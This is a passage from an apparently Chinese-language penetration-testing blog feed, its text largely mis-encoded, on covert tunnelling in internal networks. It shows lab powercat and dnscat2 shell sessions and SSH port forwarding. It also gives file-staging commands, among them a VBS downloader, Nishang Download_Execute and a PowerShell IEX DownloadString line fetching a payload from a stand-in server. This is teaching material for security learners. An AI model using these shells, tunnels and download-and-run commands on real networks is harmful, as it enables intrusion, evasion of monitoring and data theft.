a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line">unnamed 1&gt; </span><br><span class="line">unnamed 1&gt; </span><br><span class="line">C:\Users\Administrator&gt;whoami</span><br><span class="line">unnamed 1&gt; whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><h4 id="03-powercatä½œä¸ºè·³æ¿æœº"><a href="#03-powercatä½œä¸ºè·³æ¿æœº" class="headerlink" title="03.powercatä½œä¸ºè·³æ¿æœº"></a>03.powercatä½œä¸ºè·³æ¿æœº</h4><blockquote><p>ç¯å¢ƒç®€ä»‹ï¼š</p><p>3å°æœºå™¨ã€‚server 2019 èƒ½ä¸win7å’Œkaliäº’é€šï¼Œkaliä¸win7ä¸èƒ½äº’é€šï¼Œserver 2019ä½œä¸ºè·³æ¿æœºä½¿kaliä¸win7äº’é€š</p></blockquote><p><code>win7æ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe    #æœ¬åœ°ç›‘å¬9999ç«¯å£</span><br></pre></td></tr></table></figure><p><code>server 2019æ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 8888 -r tcp:10.10.10.20:9999    #æœ¬åœ°ç›‘å¬8888ç«¯å£å¹¶è½¬å‘è‡³10.10.10.20çš„9999ç«¯å£</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc 192.168.1.5 8888 -vv</span><br><span class="line">192.168.1.5: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.1.5] 8888 (?) open</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿æ¥server 2019çš„8888ç«¯å£å°±è½¬å‘åˆ°äº†win7çš„9999ç«¯å£</span></span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨DNSåè®®ï¼Œä¸tcpæ•°æ®æµæ­£å¥½ç›¸å</code></p><p><code>server 2019</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -r dns:192.168.1.7::ttpowercat.test</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>win7</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 9999 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>kaliå¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 6.1.7601]</span><br><span class="line">???????? (c) 2009 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;ipconfig</span><br><span class="line">unnamed 1&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ????</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">???????????? ????????:</span><br><span class="line"></span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line">   ???????? IPv6 ????. . . . . . . . : fe80::f161:9ab3:b020:30f1%11</span><br><span class="line">   IPv4 ???? . . . . . . . . . . . . : 10.10.10.20</span><br><span class="line">   ????????  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   ????????. . . . . . . . . . . . . : 10.10.10.2</span><br><span class="line"></span><br><span class="line">?????????? isatap.&#123;40BE814B-BB9A-4845-AADE-41A6B9E99107&#125;:</span><br><span class="line"></span><br><span class="line">   ????????  . . . . . . . . . . . . : ??????????</span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-åº”ç”¨å±‚éš§é“"><a href="#0x04-åº”ç”¨å±‚éš§é“" class="headerlink" title="0x04.åº”ç”¨å±‚éš§é“"></a>0x04.åº”ç”¨å±‚éš§é“</h2><h3 id="1-sshåè®®"><a href="#1-sshåè®®" class="headerlink" title="1.sshåè®®"></a>1.sshåè®®</h3><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿç‡ã€‚</span><br><span class="line">-fï¼šå°†SSHä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰çš„shellã€‚</span><br><span class="line">-Nï¼šå»ºç«‹é™é»˜è¿æ¥ï¼ˆçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ã€‚</span><br><span class="line">-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚</span><br><span class="line">-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€‚</span><br><span class="line">-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘ã€‚</span><br><span class="line">-Dï¼šåŠ¨æ€è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰ã€‚</span><br><span class="line">-Pï¼šæŒ‡å®šSSHç«¯å£ã€‚</span><br></pre></td></tr></table></figure><h4 id="01-æœ¬åœ°ç«¯å£è½¬å‘"><a href="#01-æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="01.æœ¬åœ°ç«¯å£è½¬å‘"></a>01.æœ¬åœ°ç«¯å£è½¬å‘</h4><blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>kaliå¯ä»¥è®¿é—®å†…ç½‘webæœåŠ¡å™¨(cnetos 7)ï¼Œä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨(win7)ï¼Œcentos 7ä¸win7å¯ä»¥ç›¸äº’è®¿é—®</p></blockquote><p><code>webæœåŠ¡å™¨ä¸ºè·³æ¿ï¼Œå°†win7çš„3389ç«¯å£æ˜ å°„åˆ°kaliçš„3309ç«¯å£ï¼Œè®¿é—®kaliçš„3309ç«¯å£å°±å¯ä»¥è®¿é—®win7dçš„3389</code></p><p><code>kaliæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 3309:10.10.10.20:3389 root@192.168.1.11</span><br><span class="line">ssh -CfNg -L 3309&lt;æœ¬åœ°ç«¯å£&gt;:10.10.10.20:3389&lt;ç›®æ ‡ä¸»æœº&gt; root@192.168.1.11&lt;è·³æ¿æœº&gt;</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723170858890.png" class><h4 id="02-è¿œç¨‹ç«¯å£è½¬å‘"><a href="#02-è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="02.è¿œç¨‹ç«¯å£è½¬å‘"></a>02.è¿œç¨‹ç«¯å£è½¬å‘</h4><blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>kaliä¸å¯ä»¥è®¿é—®å†…ç½‘æ‰€æœ‰æœºå™¨ï¼Œå†…ç½‘webæœåŠ¡å™¨(centos 7)å¯ä»¥è®¿é—®kaliï¼Œå†…ç½‘æ•°æ®åº“(win7)ä¸å¯ä»¥è®¿é—®kaliï¼Œå†…ç½‘å…¨é€šã€‚</p></blockquote><p><code>webä¸ºè·³æ¿æœºï¼Œå°†kaliçš„3319ç«¯å£çš„æµé‡è½¬å‘åˆ°ç›®æ ‡ä¸»æœºwin7çš„3389ç«¯å£ï¼Œè®¿é—®kaliçš„3319ç«¯å£å°±å¯ä»¥è®¿é—®win7çš„3389ç«¯å£</code></p><p><code>web(centos 7æ‰§è¡Œ)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3319:10.10.10.20:3389 root@192.168.1.7</span><br><span class="line">ssh -CfNg -R 3319&lt;è¿œç¨‹ä¸»æœºkaliç«¯å£&gt;:10.10.10.20:3389&lt;ç›®æ ‡ä¸»æœºwin7æ•°æ®åº“&gt; root@192.168.1.7&lt;è¿œç¨‹ä¸»æœºkali&gt;</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723172754616.png" class><blockquote><p>æœ¬åœ°ç«¯å£è½¬å‘ï¼š</p><p>åœ¨æœ¬åœ°(å®¢æˆ·æœº)ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªç«¯å£çš„æ•°æ®éƒ½ä¼šé€šè¿‡sshéš§é“è½¬å‘åˆ°è¿œç«¯å¯¹åº”çš„ç«¯å£</p><p>è¿œç¨‹ç«¯å£è½¬å‘ï¼š</p><p>åœ¨è¿œç¨‹ä¸»æœºä¸Š(æœåŠ¡å™¨)ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ‰€æœ‰è®¿é—®è¿œç¨‹æœåŠ¡å™¨æŒ‡å®šç«¯å£çš„æ•°æ®éƒ½ä¼šé€šè¿‡sshéš§é“ä¼ è¾“åˆ°æœ¬åœ°å¯¹åº”çš„ç«¯å£</p></blockquote><h3 id="2-HTTP-HTTPSåè®®"><a href="#2-HTTP-HTTPSåè®®" class="headerlink" title="2.HTTP/HTTPSåè®®"></a>2.HTTP/HTTPSåè®®</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorgå·¥å…·<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-DNSåè®®"><a href="#3-DNSåè®®" class="headerlink" title="3.DNSåè®®"></a>3.DNSåè®®</h3><p><code>æ­¤éƒ¨åˆ†å†…å®¹æµ‹è¯•éœ€è¦å…¬ç½‘åŸŸå</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsMWV4L2lvZGluZQ==">iodine<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x05-socksä»£ç†"><a href="#0x05-socksä»£ç†" class="headerlink" title="0x05.socksä»£ç†"></a>0x05.socksä»£ç†</h2><p>æ­¤éƒ¨åˆ†å†…å®¹æµ‹è¯•éœ€è¦å…¬ç½‘ipä¸å†…ç½‘ç¯å¢ƒ</p><h3 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h3><h3 id="2-ScoksCap64"><a href="#2-ScoksCap64" class="headerlink" title="2.ScoksCap64"></a>2.ScoksCap64</h3><h3 id="3-Proxychains"><a href="#3-Proxychains" class="headerlink" title="3.Proxychains"></a>3.Proxychains</h3><h2 id="0x06-å‹ç¼©æ•°æ®"><a href="#0x06-å‹ç¼©æ•°æ®" class="headerlink" title="0x06.å‹ç¼©æ•°æ®"></a>0x06.å‹ç¼©æ•°æ®</h2><p>æ¸—é€è¿‡ç¨‹ä¸­å¸¸å¸¸è¦ä¸‹è½½æ•°æ®ï¼Œè¿™é‡Œæœ‰å‡ ç§å°†æ•°æ®è¿›è¡Œå‹ç¼©æ–¹ä¾¿ä¸‹è½½çš„æŠ€æœ¯</p><h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1.RAR"></a>1.RAR</h3><p><code>è¿™é‡Œæå–å‡ºwinrarä¸‹çš„rar.exeï¼Œå‚æ•°å¦‚ä¸‹ï¼š</code></p><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>-a</td><td>æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</td></tr><tr><td>-k</td><td>é”å®šå‹ç¼©æ–‡ä»¶</td></tr><tr><td>-s</td><td>ç”Ÿæˆå­˜æ¡£æ–‡ä»¶ï¼ˆæé«˜å‹ç¼©æ¯”ï¼‰</td></tr><tr><td>-p</td><td>æŒ‡å®šå‹ç¼©å¯†ç </td></tr><tr><td>-r</td><td>é€’å½’å‹ç¼©ï¼ŒåŒ…æ‹¬å­ç›®å½•</td></tr><tr><td>-x</td><td>æŒ‡å®šè¦æ’é™¤çš„æ–‡ä»¶</td></tr><tr><td>-v</td><td>åˆ†å·æ‰“åŒ…ï¼Œå¤§æ–‡ä»¶ä½¿ç”¨</td></tr><tr><td>-ep</td><td>ä»åç§°ä¸­æ’é™¤è·¯å¾„</td></tr><tr><td>-ep1</td><td>ä»åç§°ä¸­æ’é™¤åŸºæœ¬ç›®å½•</td></tr><tr><td>-m0</td><td>å­˜å‚¨ï¼Œæ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶æ—¶ä¸å‹ç¼©æ–‡ä»¶</td></tr><tr><td>-m1</td><td>æœ€å¿«</td></tr><tr><td>-m2</td><td>è¾ƒå¿«</td></tr><tr><td>-m3</td><td>æ ‡å‡†</td></tr><tr><td>-m4</td><td>è¾ƒå¥½</td></tr><tr><td>-m5</td><td>æœ€å¥½</td></tr></tbody></table><h3 id="2-7-zip"><a href="#2-7-zip" class="headerlink" title="2.7-zip"></a>2.7-zip</h3><blockquote><p>è¿™é‡Œæå–7z.exeï¼Œå‚æ•°å¦‚ä¸‹</p></blockquote><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>-r</td><td>é€’å½’å‹ç¼©</td></tr><tr><td>-o</td><td>æŒ‡å®šè¾“å‡ºç›®å½•</td></tr><tr><td>-p</td><td>æŒ‡å®šå¯†ç </td></tr><tr><td>-v</td><td>åˆ†å·å‹ç¼©</td></tr><tr><td>a</td><td>æ·»åŠ å‹ç¼©æ–‡ä»¶</td></tr></tbody></table><h2 id="0x07-ä¸Šä¼ ä¸‹è½½"><a href="#0x07-ä¸Šä¼ ä¸‹è½½" class="headerlink" title="0x07.ä¸Šä¼ ä¸‹è½½"></a>0x07.ä¸Šä¼ ä¸‹è½½</h2><p>å¯¹äºä¸èƒ½ä¸Šä¼ shellï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„windowsæœåŠ¡å™¨ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½æ“ä½œ</p><h3 id="1-ftpåè®®ä¸Šä¼ ä¸‹è½½"><a href="#1-ftpåè®®ä¸Šä¼ ä¸‹è½½" class="headerlink" title="1.ftpåè®®ä¸Šä¼ ä¸‹è½½"></a>1.ftpåè®®ä¸Šä¼ ä¸‹è½½</h3><p><code>å¸¸ç”¨å‘½ä»¤</code></p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>open &lt;æœåŠ¡å™¨åœ°å€&gt;</td><td>é“¾æ¥æœåŠ¡å™¨</td></tr><tr><td>cd &lt;ç›®å½•å&gt;</td><td>è¿›å…¥æŒ‡å®šç›®å½•</td></tr><tr><td>lcd &lt;æ–‡ä»¶å¤¹è·¯å¾„&gt;</td><td>å®šä½æœ¬åœ°æ–‡ä»¶å¤¹ï¼ˆä¸Šä¼ æ–‡ä»¶çš„ä½ç½®æˆ–è€…ä¸‹è½½æ–‡ä»¶çš„æœ¬åœ°ä½ç½®ï¼‰</td></tr><tr><td>type</td><td>æŸ¥çœ‹å½“å‰çš„ä¼ è¾“æ–¹å¼</td></tr><tr><td>ascii</td><td>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºasciiç ï¼ˆTXTæ–‡ä»¶ç­‰ï¼‰</td></tr><tr><td>binary</td><td>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºäºŒè¿›åˆ¶ä¼ è¾“ï¼ˆEXEæ–‡ä»¶ï¼Œå›¾ç‰‡ï¼Œè§†é¢‘ï¼‰</td></tr><tr><td>close</td><td>ç»“æŸä¸ftpæœåŠ¡å™¨çš„ä¼šè¯</td></tr><tr><td>quit</td><td>ç»“æŸä¸ftpæœåŠ¡å™¨çš„ä¼šè¯å¹¶é€€å‡ºftpç¯å¢ƒ</td></tr><tr><td>put &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸Šä¼ ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>send &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸Šä¼ ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>get &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸‹è½½ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>mget &lt;æ–‡ä»¶å&gt; [æ–‡ä»¶åâ€¦]</td><td>ä¸‹è½½å¤šä¸ªæ–‡ä»¶ï¼Œæ”¯æŒç©ºæ ¼å’Œ?é€šé…ç¬¦ï¼Œå¦‚ä¸‹è½½æ‰€æœ‰MP3æ–‡ä»¶ï¼šmget .mp3</td></tr></tbody></table><h3 id="2-vbsä¸Šä¼ "><a href="#2-vbsä¸Šä¼ " class="headerlink" title="2.vbsä¸Šä¼ "></a>2.vbsä¸Šä¼ </h3><blockquote><p>åˆ©ç”¨vbsä¸Šä¼ ä¸»è¦ä½¿ç”¨msxm12.xmlhttpå’Œadobd.streamå¯¹è±¡ï¼Œdownload.vbsæ–‡ä»¶ï¼š</p><p>ä½¿ç”¨echo å†…å®¹ &gt;&gt; download.vbsé€è¡Œå†™å…¥åæ‰§è¡Œ</p><p>Cscript download.vbs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://server_ip/target.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\Test\target.exe&quot;,2</span><br></pre></td></tr></table></figure><h3 id="3-Nishangä¸Šä¼ "><a href="#3-Nishangä¸Šä¼ " class="headerlink" title="3.Nishangä¸Šä¼ "></a>3.Nishangä¸Šä¼ </h3><blockquote><p>Nishangå°†ä¸Šä¼ çš„EXEæ–‡ä»¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶çš„å½¢å¼ç„¶åç”¨echoè®¿é—®ç›®æ ‡æœåŠ¡å™¨æœ€åä½¿ç”¨Download_Executeè„šæœ¬ä¸‹è½½ã€‚<br>å…ˆåˆ©ç”¨Nishangä¸­çš„exetotext.ps1è„šæœ¬å°†Metasploitç”Ÿæˆçš„msf.exeä¿®æ”¹é—®msf.txtï¼š</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ ExetoText c\:msf.exe c:\msf.txt</span><br></pre></td></tr></table></figure><blockquote><p>æ¥ç€é€šè¿‡echoå°†hexå€¼æ·»åŠ åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè°ƒç”¨Download_Executeï¼š</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download_Execute http://server_ip/target.txt</span><br></pre></td></tr></table></figure><h3 id="4-Debugä¸Šä¼ "><a href="#4-Debugä¸Šä¼ " class="headerlink" title="4.Debugä¸Šä¼ "></a>4.Debugä¸Šä¼ </h3><h3 id="5-bitsadminä¸‹è½½"><a href="#5-bitsadminä¸‹è½½" class="headerlink" title="5.bitsadminä¸‹è½½"></a>5.bitsadminä¸‹è½½</h3><blockquote><p>bitsadminä¸æ”¯æŒHTTPSå’ŒFTPï¼Œä¸”åœ¨Windows XP/Server 2003åŠä»¥å‰çš„ç‰ˆæœ¬æ— æ³•ä½¿ç”¨ï¼ŒWindows7/8/10è‡ªå¸¦ã€‚</p></blockquote><h3 id="6-PowerShellä¸‹è½½"><a href="#6-PowerShellä¸‹è½½" class="headerlink" title="6.PowerShellä¸‹è½½"></a>6.PowerShellä¸‹è½½</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://server_ip/target.exe&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01.åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01.åŸºç¡€çŸ¥è¯†&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å®Œæˆå†…ç½‘ä¿¡æ¯æœé›†åï¼Œéœ€è¦å…ˆåˆ¤æ–­æµé‡æ˜¯å¦å‡ºå¾—å»ã€è¿›å¾—æ¥ã€‚éšè—é€šä¿¡éš§é“æŠ€æœ¯å¸¸ç”¨äºåœ¨è®¿é—®å—é™çš„ç½‘ç»œç¯å¢ƒä¸­è¿½è¸ªæ•°æ®æµå‘å’Œåœ¨éå—ä¿¡ä»»çš„ç½‘ç»œä¸­å®ç°å®‰å…¨çš„æ•°æ®ä¼ è¾“ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#1-æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;1.æ¦‚è¿°&quot;&gt;&lt;/a&gt;1.æ¦‚è¿°&lt;/h3&gt;&lt;p&gt;â€‹        åœ¨æ¸—é€åœºæ™¯ä¸­ï¼Œå„ç§å®‰å…¨è®¾å¤‡ä¼šæ£€æŸ¥å¯¹å¤–è¿æ¥çš„æƒ…å†µï¼Œå¦‚æœå‘ç°å¼‚å¸¸ï¼Œå°±ä¼šå¯¹é€šä¿¡è¿›è¡Œé˜»æ–­ã€‚å› æ­¤å»ºç«‹ä¸“é—¨çš„éšè”½éš§é“å°±ååˆ†å¿…è¦ï¼Œè¿™èƒ½ç»•è¿‡ç«¯å£å±è”½ã€‚&lt;br&gt;å¸¸ç”¨çš„éš§é“å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ç½‘ç»œå±‚éš§é“ï¼šIPv6ã€ICMPã€GRE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ä¼ è¾“å±‚éš§é“ï¼šTCPã€UDPã€å¸¸è§„ç«¯å£è½¬å‘&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;åº”ç”¨å±‚éš§é“ï¼šSSHã€HTTPã€HTTPSã€DNS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Armitage</title>
    <link href="https://lunamoore.github.io/2021/07/19/Armitage/"/>
    <id>https://lunamoore.github.io/2021/07/19/Armitage/</id>
    <published>2021-07-19T09:33:15.000Z</published>
    <updated>2021-07-19T09:49:21.195Z</updated>
    
